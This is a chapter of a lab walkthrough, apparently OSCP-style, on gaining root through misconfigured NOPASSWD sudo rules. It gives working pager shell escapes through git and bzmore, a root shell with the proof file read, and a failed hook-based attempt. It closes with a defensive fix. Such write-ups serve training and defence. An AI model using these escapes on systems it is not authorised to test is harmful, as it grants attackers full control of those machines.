# 06 — `sudo -l` → root

`gari` is in no administrative group, but the sudoers file hands out five binaries with `NOPASSWD`.
Two of them are pagers, and a pager that runs as root is a shell.

## 6.1 The sudoers entry

```bash
gari@oscp:~$ sudo -l
```

```text
Matching Defaults entries for gari on oscp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User gari may run the following commands on oscp:
    (ALL : ALL) NOPASSWD: /usr/bin/calendar
    (ALL : ALL) NOPASSWD: /usr/bin/bzmore
    (ALL : ALL) NOPASSWD: /usr/bin/git
    (ALL : ALL) NOPASSWD: /usr/bin/mcheck
    (ALL : ALL) NOPASSWD: /usr/bin/rdma
```

Five entries, no wildcard, no argument restriction. Every one of them is a program that either reads
files or starts another program — which is all a `sudo` rule needs to become root.

## 6.2 Reading the list the right way

Look each binary up before trying anything clever. The pattern is always the same: does the program
have a documented way to spawn a shell or execute a command?

| Binary | Route | Notes |
|---|---|---|
| `/usr/bin/git` | `sudo git -p help config`, then `!/bin/sh` in the pager | `-p` forces the pager even without a tty; `less` runs `!` commands |
| `/usr/bin/bzmore` | `sudo bzmore /etc/passwd`, then `!sh` | same pager trick, different program |
| `/usr/bin/calendar` | reads arbitrary files as root | file disclosure, not a shell |
| `/usr/bin/mcheck` | mtools disk check — reads a filesystem image | file disclosure |
| `/usr/bin/rdma` | netlink operations as root | no direct shell; useful only in specific setups |

`git` and `bzmore` both end in a root shell. The rest are information leaks at best.

## 6.3 What does *not* work

Writing a `pre-commit` hook and letting `git` run it is the first idea, and it fails for an obvious
reason once you see the error:

```bash
gari@oscp:/var/www/html$ echo 'exec /bin/sh 0<&2 1>&2' > .git/hooks/pre-commit
-bash: .git/hooks/pre-commit: Permission denied
```

`/var/www/html` belongs to `www-data`; `gari` cannot write the hook, so the hook never exists to be
run. The hook trick needs write access to a repository that root will operate on — not the case here.

`git --exec-path=.` has the same problem from the other side: it makes `git` look for `git-<cmd>` in
the current directory, but the file still has to be executable by the user running `sudo`, and `git`
drops privileges for some subcommands. The pager route needs neither.

## 6.4 Root, through the pager

```bash
gari@oscp:~$ sudo git -p help config
```

`git` opens the `git-config` manual page in `less`, running as root. From `less`, `!` starts a shell:

```text
!/bin/sh
```

```text
root@oscp:/home/gari# id
uid=0(root) gid=0(root) groups=0(root)
root@oscp:/home/gari# cd /root
root@oscp:/root# cat proof.txt
********************************
```

The `bzmore` route is identical in spirit and worth knowing if `git` is ever removed from the list:

```bash
sudo bzmore /etc/passwd
# inside the pager:
!sh
```

## 6.5 The flag

```text
/root/proof.txt
```

Masked here. Capture it with `hostname`, `whoami` and `id` in the same screenshot — a bare flag line is
the easiest evidence for a grader to dispute.

## 6.6 Why this is the intended path

The sudoers list is not random. `calendar`, `mcheck` and `rdma` are all programs that read data as
root; `bzmore` and `git` are both pagers. The box is testing one specific habit: **when `sudo -l`
returns a program you do not recognise, look it up before you dismiss it** — and when it returns a
pager, remember that a pager can run commands.

A one-line fix on the defensive side: never grant `NOPASSWD` on a program with a shell escape, and if
you must, pin the arguments (`/usr/bin/git -p help` is still a shell; `/usr/bin/bzmore /var/log/x.log`
is not).

---

**Next:** [`README.md`](README.md)
